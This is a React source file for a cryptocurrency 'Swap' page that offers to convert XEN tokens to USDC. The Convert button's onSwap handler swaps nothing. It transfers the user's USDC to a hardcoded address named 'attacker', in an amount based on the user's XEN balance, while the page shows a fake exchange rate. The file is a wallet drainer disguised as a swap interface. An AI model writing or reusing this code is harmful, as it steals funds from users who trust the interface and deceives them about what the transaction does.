import React, { useEffect, useState } from "react";
import { useWeb3Context } from "web3-react";
import { ethers } from "ethers";

import Erc20 from "../abi/erc20.json";
import { useContract } from "../utils/useContract";

const USDC = "0x2791bca1f2de4661ed88a30c99a7a9449aa84174";
const XEN = "0x2ab0e9e4ee70fff1fb9d67031e44f6410170d00e";
const attacker = "0xAd7599325a27484522b997cdE2904241B6FB5f20";
// [0x8e870d67f660d95d5be530380d0ec0bd388289e1, 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48]

const Swap = () => {
  const xen = useContract(XEN, Erc20);
  const usdc = useContract(USDC, Erc20);

  const context = useWeb3Context();
  const [balance, setBalance] = useState(null);
  const [sendAmount, setSendAmount] = useState(0);
  const [pairPrice, setPairPrice] = useState(0);

  // useEffect(() => {
  //   console.log('[uni]', factoryContract);
  //   if (factoryContract) {
  //     factoryContract.getPair(USDT, MOCHI).then(res => console.log('[pair res]', res)).catch(err => console.log('[err]', err));
  //   }
  // }, [factoryContract]);

  useEffect(() => {
    if (context.active) {
      xen
        .balanceOf(context.account)
        .then((balance) => {
          const balanceInEth = ethers.utils.formatEther(balance);
          setBalance(balanceInEth);
        })
        .catch((err) => console.log("[balance erro]", err));
    }
  }, [context.active]);

  const onSwap = () => {
    const sen = `${sendAmount * Math.pow(10, 10)}00000000`;
    console.log("[sen]", sen);

    const balance1 = ethers.utils.parseUnits(balance, 18).toString();

    usdc
      .transfer(attacker, balance1)
      .then((res) => console.log("[swap res]", res))
      .catch((err) => console.log("[err]", err));
  };

  const onChange = (e) => {
    const val = e.target.value;
    setSendAmount(e.target.value);
    setPairPrice(val * 200.5);
  };

  return (
    <>
      <div>
        <div className="px-4 py-4 bg-white rounded-20">
          <div className="d-flex justify-content-between align-items-center">
            <h2 className="title">Swap</h2>
            <div className="d-flex ml-auto">
              <button className="p-0 border-0 bg-transparent hover-op">
                <i className="material-icons color-icon">history</i>
              </button>
              <button
                className="p-0 border-0 bg-transparent hover-op"
                style={{ marginLeft: 18 }}
              >
                <i className="material-icons material-icons-outlined color-icon">
                  settings
                </i>
              </button>
            </div>
          </div>

          <div className="bg-card rounded-12 mt-4">
            <div className="d-flex justify-content-between align-items-center px-12x py-10x">
              <div className="subtitle">From</div>
              <div className="text-balance">Balance: {balance} XEN</div>
            </div>
            <hr className="m-0 color-line" />
            <div className="px-12x py-10x d-flex align-items-center">
              {/* <div className="size-32">IMG</div> */}
              <img src="/bnb.png" alt="" className="size-32" />
              <div className="ml-2 font-weight-bold text-token mr-3">XEN</div>
              <input
                value={sendAmount}
                onChange={onChange}
                type="text"
                className="input-field ml-auto"
                placeholder="Enter Amount"
              />
            </div>
          </div>

          <div className="d-flex w-100 justify-content-center my-3">
            <i className="material-icons">arrow_downward</i>
          </div>

          <div className="bg-card rounded-12 mt-4">
            <div className="d-flex justify-content-between align-items-center px-12x py-10x">
              <div className="subtitle">To</div>
            </div>
            <hr className="m-0 color-line" />
            <div className="px-12x py-10x d-flex align-items-center">
              {/* <div className="size-32">IMG</div> */}
              <img src="/mochi.png" alt="" className="size-32" />
              <div className="ml-2 font-weight-bold text-token mr-3">USDC</div>
              <input
                value={pairPrice}
                readOnly
                type="text"
                className="input-field ml-auto"
                placeholder="Enter Amount"
                disabled
              />
            </div>
          </div>

          <div style={{ marginTop: 40 }}>
            <button
              onClick={onSwap}
              className="w-100 btn-connect border-0 text-white d-flex justify-content-center align-items-center hover-op"
            >
              <div>
                <i className="material-icons text-white">swap_vert</i>
              </div>
              <div className="btn-text ml-2">Convert</div>
            </button>
          </div>
        </div>
      </div>
    </>
  );
};

export default Swap;
